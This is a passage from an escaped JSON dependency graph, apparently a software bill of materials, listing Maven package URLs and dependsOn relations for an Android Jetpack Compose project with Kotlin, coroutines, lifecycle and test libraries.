\"pkg:maven/androidx.compose.animation/animation-core@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.animation/animation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation-layout-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation-layout@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-icons-core-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-icons-core@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-ripple-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-ripple@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material3/material3-android@1.2.1?type=jar\",\n                \"pkg:maven/androidx.compose.material3/material3@1.2.1?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime-saveable-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime-saveable@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-data@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/junit/junit@4.13.2?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.hamcrest/hamcrest-core@1.3?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.hamcrest/hamcrest-core@1.3?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.test/core@1.5.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.concurrent/concurrent-futures@1.1.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common@2.3.1?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n                \"pkg:maven/androidx.test.services/storage@1.4.2?type=jar\",\n                \"pkg:maven/androidx.test/monitor@1.6.1?type=jar\",\n                \"pkg:maven/androidx.tracing/tracing@1.0.0?type=jar\",\n                \"pkg:maven/com.google.guava/listenablefuture@1.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.8.22?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation-jvm@1.7.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.8.22?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.8.22?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.8.22?type=jar\",\n                \"pkg:maven/org.jetbrains/annotations@13.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.8.22?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.test/monitor@1.6.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.test/annotation@1.0.1?type=jar\",\n                \"pkg:maven/androidx.tracing/tracing@1.0.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.test/annotation@1.0.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation-experimental@1.1.0?type=jar\",\n                \"pkg:maven/androidx.annotation/annotation-experimental@1.4.0?type=jar\",\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.annotation/annotation-experimental@1.1.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.tracing/tracing@1.0.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.test.services/storage@1.4.2?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.test/annotation@1.0.1?type=jar\",\n                \"pkg:maven/androidx.test/monitor@1.6.1?type=jar\",\n                \"pkg:maven/com.google.code.findbugs/jsr305@2.0.2?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.code.findbugs/jsr305@2.0.2?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.lifecycle/lifecycle-common@2.3.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.guava/listenablefuture@1.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.concurrent/concurrent-futures@1.1.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/com.google.guava/listenablefuture@1.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.test/runner@1.5.2?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.test.services/storage@1.4.2?type=jar\",\n                \"pkg:maven/androidx.test/annotation@1.0.1?type=jar\",\n                \"pkg:maven/androidx.test/monitor@1.6.1?type=jar\",\n                \"pkg:maven/androidx.tracing/tracing@1.0.0?type=jar\",\n                \"pkg:maven/junit/junit@4.13.2?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.test.espresso/espresso-idling-resource@3.5.1?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.squareup/javawriter@2.1.1?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/javax.inject/javax.inject@1?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/org.hamcrest/hamcrest-library@1.3?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.hamcrest/hamcrest-core@1.3?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.hamcrest/hamcrest-integration@1.3?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.hamcrest/hamcrest-library@1.3?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/junit/junit@4.13.2?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.8.22?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.8.22?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.8.22?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.8.22?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-test@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.runtime/runtime-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime-saveable@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime-saveable@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.runtime/runtime-saveable@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.runtime/runtime-saveable-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.ui/ui-geometry-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.8.22?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.8.20?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/atomicfu@0.20.2?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core-jvm@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.8.20?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk7@1.8.20?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.8.22?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk7@1.8.20?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.8.22?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlinx/atomicfu@0.20.2?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.8.22?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-test@1.7.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.8.22?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/atomicfu@0.20.2?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-test-jvm@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk7@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains/annotations@13.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk7@1.9.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.annotation/annotation-jvm@1.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains/annotations@13.0?type=jar\",\n                \"pkg:maven/org.jetbrains/annotations@23.0.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.annotation/annotation-experimental@1.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common-java8@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-livedata-core@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-process@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-savedstate@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-android@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-android@1.7.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-bom@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core-jvm@1.7.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-bom@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains/annotations@23.0.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-bom@1.7.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-android@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core-jvm@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-test-jvm@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-test@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-test-jvm@1.7.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-bom@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\",\n                \"pkg:maven/org.jetbrains/annotations@23.0.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.arch.core/core-common@2.2.0?type=jar\",\n                \"pkg:maven/androidx.arch.core/core-runtime@2.2.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common-java8@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-livedata-core@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-process@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-savedstate@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n                \"pkg:maven/androidx.profileinstaller/profileinstaller@1.3.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.lifecycle/lifecycle-runtime-ktx@2.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common-java8@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-livedata-core@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-process@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-savedstate@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-android@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common-java8@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-livedata-core@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-process@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-savedstate@2.7.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-ktx@2.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.lifecycle/lifecycle-common-java8@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-livedata-core@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-process@2.7.0?type=jar\",\n                